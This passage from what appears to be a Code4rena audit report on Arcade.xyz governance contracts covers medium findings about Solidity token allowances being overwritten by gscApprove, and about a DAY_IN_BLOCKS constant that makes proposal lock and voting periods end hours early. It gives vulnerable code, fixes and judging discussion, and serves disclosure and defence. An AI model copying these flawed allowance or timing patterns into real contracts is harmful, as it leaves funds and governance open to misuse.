allowance.</p>\n<p>The code is as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">gscApprove</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">GSC_CORE_VOTING_ROLE</span><span class=\"mtk1\">) </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">spender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">T_ZeroAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;spender&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">T_ZeroAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Will underflow if amount is greater than remaining allowance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;      </span><span class=\"mtk12\">gscAllowance</span><span class=\"mtk1\">[</span><span class=\"mtk12\">token</span><span class=\"mtk1\">] -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">spendThresholds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">token</span><span class=\"mtk1\">].</span><span class=\"mtk12\">small</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">limit</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that after processing this we will not have spent more than the block limit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spentThisBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">blockExpenditure</span><span class=\"mtk1\">[</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">spentThisBlock</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">limit</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">T_BlockSpendLimit</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">blockExpenditure</span><span class=\"mtk1\">[</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">spentThisBlock</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// approve tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;      </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TreasuryApproval</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }    </span></span></span></code></pre>\n<p>From the above code, we can see that when executed, <code>gscApprove</code> consumes <code>gscAllowance[]</code> and ultimately uses <code>IERC20(token).approve();</code> to give the <code>spender</code> allowance. Since the direct use is <code>IERC20.approve(spender, amount)</code>, the amount of the allowance is overwritten, whichever comes last.</p>\n<p>In the other method,s <code>approveSmallSpend</code>, <code>approveMediumSpend</code> and <code>approveLargeSpend</code> also use <code>IERC20(token).approve();</code>, which causes them to override each other if targeting the same <code>spender</code>.</p>\n<p>Even if there is a malicious <code>GSC_CORE_VOTING_ROLE</code>, it is possible to execute <code>gscApprove(amount=1 wei)</code> after <code>approveLargeSpend()</code> to reset to an allowance of only <code>1 wei</code>.</p>\n<p>The recommendation is to use accumulation to avoid, intentionally or unintentionally, overwriting each other.</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">limit</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that after processing this we will not have spent more than the block limit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spentThisBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">blockExpenditure</span><span class=\"mtk1\">[</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">spentThisBlock</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">limit</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">T_BlockSpendLimit</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">blockExpenditure</span><span class=\"mtk1\">[</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">spentThisBlock</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// approve tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-      </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">old</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">allowance</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span><span class=\"mtk12\">spender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">spender</span><span class=\"mtk1\">,  </span><span class=\"mtk12\">old</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TreasuryApproval</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span></span></span></code></pre>\n<h3 id=\"assessed-type-3\" style=\"position:relative;\"><a href=\"#assessed-type-3\" aria-label=\"assessed type 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Context</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/85#issuecomment-1656739746\">__141345__ (lookout) commented</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/58\">https://github.com/code-423n4/2023-07-arcade-findings/issues/58</a> talks about the issue with internal accounting of <code>gscAllowance</code>. Another aspect of the issue.</p>\n<p>This report shows some unexpected results due to the external <code>erc20</code> allowance overwrite.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/85#issuecomment-1662892556\">PowVT (Arcade.xyz) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/85#issuecomment-1678449357\">0xepley (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Doesn’t it fall under the admin mistake? The admin would be aware and can change these to desired values anytime. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/85#issuecomment-1679352993\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>Doesn’t it fall under the admin mistake? The admin would be aware and can change these to desired values anytime. </p>\n</blockquote>\n<p>I don’t believe this should be viewed as input sanitization, as the core functionality is written in a way that has unexpected consequences that could affect the functionality of the protocol. I can see arguing for QA, I welcome more comments from other wardens or sponsors.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/85#issuecomment-1679372514\">0xnev (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@0xean - correct me if I’m wrong, but I think it is intended for allowance to be overwritten for the spender when it is decreased, given the changing of approval needs to go through a GSC proposal.</p>\n<p>But since this report also highlights the potential inability to reduce allowance due to underflow in the <code>gscAllowance</code> mapping, it should be duplicated with #58.</p>\n<p>Again correct me if I’m wrong, If the above reasoning is correct, #55, #146, and #535 should be invalidated since they do not mention the possible DoS when decreasing allowance.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-day_in_blocks-is-incorrect\" style=\"position:relative;\"><a href=\"#m-07-day_in_blocks-is-incorrect\" aria-label=\"m 07 day_in_blocks is incorrect permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/70\">[M-07] <code>DAY_IN_BLOCKS</code> is incorrect</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/70\">Anirruth</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/574\">DadeKuma</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/228\">bart1e</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/154\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/133\">Matin</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/112\">giovannidisiena</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/73\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/56\">MohammedRizwan</a></em></p>\n<p>The day in blocks is calculated with the block time as 13.3 seconds in CoreVoting.sol.:\n<code>uint256 public constant DAY_IN_BLOCKS = 6496;</code>, but since moving to proof of stake, block times are fixed to 12 seconds per block. <a href=\"https://ethereum.org/en/developers/docs/consensus-mechanisms/pos/#:~:text=Whereas%20under%20proof%2Dof%2Dwork,block%20proposer%20in%20every%20slot\">Reference</a>.</p>\n<p>This results in an incorrect calculation of the <code>lockDuration</code> and <code>extraVoteTime</code>, which is used in setting the total duration of a proposal should be active and also the max vote time.</p>\n<p>The time difference can be calculated:</p>\n<p><code>3*24*60*60 / 13.3</code> = 19488.721804511 (<code>lockDuration</code> with 13.3 seconds).<br>\n<code>3*24*60*60 / 12</code> = 21600 (<code>lockDuration</code> with 12 seconds).<br>\n21600 - 19488.7 = 2111.3<br>\n<code>2111.3*12 / (60*60)</code> = 7.03 (difference in hours for <code>lockDuration</code>).</p>\n<p><code>5*24*60*60 / 13.3</code> = 32481.203007519 (<code>extraVoteTime</code> with 13.3 seconds).<br>\n<code>5*24*60*60 / 12</code> = 36000 (<code>extraVoteTime</code> with 12 seconds).<br>\n36000 - 32481.2 = 3518.8<br>\n<code>3518.8*12 / (60*60)</code> = 11.72 (difference in hours <code>extraVoteTime</code>).</p>\n<p>By using block time as 13.3 seconds, the <code>lockDuration</code> expires 7 hours earlier and the <code>extraVoteTime</code> expires 11.72 hours earlier. Since it is a significant time and affects the proposal and voting duration, I consider medium severity to be fair.</p>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS code</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><code>86400 / 12</code> = 7200<br>\nChange the <code>DAY_IN_BLOCKS</code> to 7200:<br>\n<code>uint256 public constant DAY_IN_BLOCKS = 7200;</code></p>\n<h3 id=\"assessed-type-4\" style=\"position:relative;\"><a href=\"#assessed-type-4\" aria-label=\"assessed type 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Error</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/56#issuecomment-1677626349\">PowVT (Arcade.xyz) disagreed with severity, confirmed and commented via duplicate issue #56</a>:</strong></p>\n<blockquote>\n<p>QA - Having a shorter <code>staleBlockLag</code> doesn’t affect the contract’s behavior at all really. Just makes things a bit more confusing for those reading the code. We will accept this since it is a very straightforward change and helps the readability of the contract.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/56#issuecomment-1677659553\">0xean (judge) decreased severity to QA via duplicate issue #56</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/56#issuecomment-1678791284\">MohammedRizwan (warden) commented via duplicate issue #56</a>:</strong></p>\n<blockquote>\n<p>@0xean @PowVT - With due respect to the sponsor and judge, I would like to add below additional context:</p>\n<p>This should be considered a valid Medium. It’s not about the readability of the code, but about the design consideration which is currently deviating. 13.3 seconds was for proof of work and the proposed 12 seconds is for the proof of stake which happened after the Ethereum merge. The overall impact has been described in the report and it’s duplicate.</p>\n<p>Let’s consider a case related to voting and the number of blocks considered in the current implementation:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">DAY_IN_BLOCKS</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">6496</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The lock duration is 3 days by default:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lockDuration</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">DAY_IN_BLOCKS</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">3</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Lock duration in number of blocks = <code>19_488</code>.</p>\n<p>Now, as I said, Ethereum produces blocks at 12 seconds. Ethereum <a href=\"https://ethereum.org/en/developers/docs/blocks/#:~:text=In%20Ethereum%2C%20time%20is%20divided,the%20block%20time%20is%2012s.\">official reference</a> and <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/assets/112799398/02ce13e4-e762-488c-b70c-7f9273a67308\">chart</a>.</p>\n<p>Therefore, the lock duration will expire in 2.7 days instead of 3 days.</p>\n<p>How? Let’s see below:</p>\n<p>Lock duration in number of blocks = <code>19_488</code> blocks<br>\nBlock formation period = 12 seconds <br>\nLock duration will expire in  =  <code>19_488 X 12 = 2,33,856 seconds</code> ~ 2.7 days </p>\n<p>Such <code>blockduration</code> issues have been judged as Medium/High in past Code4rena audits. I am putting below the reference report link from backstage as the report is not public yet. This <a href=\"https://github.com/code-423n4/2023-05-maia-findings/issues/417\">reference</a> report was judged by Trust.</p>\n<p>The in-scope Issue 2 about <code>staleBlockLag</code> is to be considered as <code>between 1 and 2 months (equivalent in blocks)</code> per sponsor response in a discord chat.</p>\n<p>Let’s consider 1 month for <code>staleBlockLag</code>:</p>\n<p>With current implementation:\n<code>staleBlockLag</code> with 1 month(equivilent in blocks) = <code>1_94_887</code>.</p>\n<p>With proposed recommendation:\n<code>staleBlockLag</code> with 1 month(equivilent in blocks) = <code>2_16_000</code>.</p>\n<p>Total difference = <code>21_113</code> blocks.</p>\n<p>It means <code>staleBlockLag</code> will expire before 2.93 days i.e. ~ 27 days instead of 30 days (1 month as designed for).</p>\n<p>This is a major change in arcade protocol design reducing the block duration time to 12 seconds instead of 13.3 seconds. This will affect not only contracts in scope but it will also the out-of-scope contracts relating to voting calculations.</p>\n<p>I believe this should be considered a Medium.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/56#issuecomment-1680521473\">0xean (judge) increased severity to Medium and commented via duplicate issue #56</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements</p>\n</blockquote>\n<p>After reviewing this all further, and re-reading the C4 documentation I think this does qualify as Medium. While there are setters for some of these variables that could be modified to end up with the correct values, this issue <em>does</em> impact the functionality of the protocol.</p>\n<p>I will go ahead and upgrade all of these to Medium.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-approved-gscapprove-allowance-to-an-address-may-not-able-to-be-decreased\" style=\"position:relative;\"><a href=\"#m-08-approved-gscapprove-allowance-to-an-address-may-not-able-to-be-decreased\" aria-label=\"m 08 approved gscapprove allowance to an address may not able to be decreased permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/58\">[M-08] Approved <code>gscApprove</code> allowance to an address may not able to be decreased</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/58\">Juntao</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/59\">Juntao</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/528\">UniversalCrypto</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/480\">vangrim</a>, Jiamin (<a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/289\">1</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/288\">2</a>), crunch (<a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/209\">1</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/208\">2</a>), <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/189\">zaevlad</a>, <a 